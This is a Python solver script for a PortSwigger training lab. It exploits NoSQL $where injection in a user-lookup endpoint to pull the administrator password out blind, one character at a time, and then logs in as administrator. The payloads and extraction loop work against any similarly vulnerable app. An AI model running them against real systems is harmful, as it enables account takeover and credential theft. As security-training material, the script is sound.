#!/usr/bin/env python3
"""
Exploiting NoSQL injection to extract data
PortSwigger Web Security Academy -- NoSQL Injection

Companion script for the writeup: 03-nosql-injection-extract-data.md

What this does:
    Logs in as wiener:peter to reach the authenticated /user/lookup?user=X endpoint,
    then uses that endpoint's $where JavaScript evaluation as a blind boolean oracle:
    a real user's lookup returns a fixed byte length, so any injected condition that
    reproduces that exact length is true. First determines the administrator's
    password length with this.password.length == N, then extracts the password
    character by character with this.password.match(/^<known-prefix><candidate>/).
    Positions are swept sequentially, but each position's full charset is fired
    concurrently via asyncio -- the same shape as the actual run, which is why the
    && in these payloads is passed through httpx's params={} dict rather than a
    hand-built URL string (a literal & in a raw query string breaks the request).

Usage:
    python 03-nosql-injection-extract-data.py <lab-url>

Requirements:
    pip install httpx
"""

import asyncio
import re
import string
import sys
import httpx

CHARSET = string.ascii_lowercase + string.digits
FULL_CHARSET = CHARSET + string.ascii_uppercase + string.punctuation


async def solve_async(lab_url: str) -> None:
    login_url = f"{lab_url}/login"
    lookup_url = f"{lab_url}/user/lookup"

    async with httpx.AsyncClient(timeout=15, follow_redirects=False) as client:
        r_login = await client.get(login_url)
        csrf = re.search(r'name="csrf"\s+value="([^"]+)"', r_login.text).group(1)
        r = await client.post(
            login_url,
            data={"csrf": csrf, "username": "wiener", "password": "peter"},
            cookies=r_login.cookies,
        )
        cookies = dict(r.cookies)
        print(f"[*] Logged in as wiener, session={list(cookies.values())[0][:12]}...")

        r_base = await client.get(lookup_url, params={"user": "administrator"}, cookies=cookies)
        base_len = len(r_base.text)
        print(f"[*] Baseline lookup: {r_base.status_code} len={base_len}")

        sem = asyncio.Semaphore(10)

        async def _test_len(length):
            async with sem:
                payload = f"administrator' && this.password.length == {length} && 'x"
                r = await client.get(lookup_url, params={"user": payload}, cookies=cookies)
                return length if len(r.text) == base_len else None

        len_tasks = [_test_len(l) for l in range(1, 50)]
        len_results = await asyncio.gather(*len_tasks)
        pw_len = next((l for l in len_results if l is not None), 0)
        if not pw_len:
            print("[-] Could not determine password length")
            return
        print(f"[+] Password length: {pw_len}")

        password = ""

        async def _try_pw_char(c, prefix):
            async with sem:
                escaped = re.escape(c)
                payload = f"administrator' && this.password.match(/^{re.escape(prefix)}{escaped}/) && 'x"
                r = await client.get(lookup_url, params={"user": payload}, cookies=cookies)
                return c if len(r.text) == base_len else None

        for pos in range(pw_len):
            tasks = [_try_pw_char(c, password) for c in FULL_CHARSET]
            results = await asyncio.gather(*tasks)
            match = next((c for c in results if c is not None), None)
            if match:
                password += match
                print(f"  [+] password[{pos}] = '{match}' -> '{password}'")
            else:
                print(f"  [-] no candidate matched at position {pos}, stopping early")
                break

        print(f"[+] Extracted password: {password}")

        r_login2 = await client.get(login_url)
        csrf2 = re.search(r'name="csrf"\s+value="([^"]+)"', r_login2.text).group(1)
        r_admin = await client.post(
            login_url,
            data={"csrf": csrf2, "username": "administrator", "password": password},
            cookies=r_login2.cookies,
            follow_redirects=True,
        )
        print(f"[*] Admin login: {r_admin.status_code} url={r_admin.url}")

        r_home = await client.get(lab_url, follow_redirects=True)
        if "Congratulations" in r_home.text:
            print("[+] Lab solved -- logged in as administrator with the extracted password.")
        else:
            print("[-] Not solved yet -- check the extracted password against the lookup oracle.")


def solve(lab_url: str) -> None:
    asyncio.run(solve_async(lab_url))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
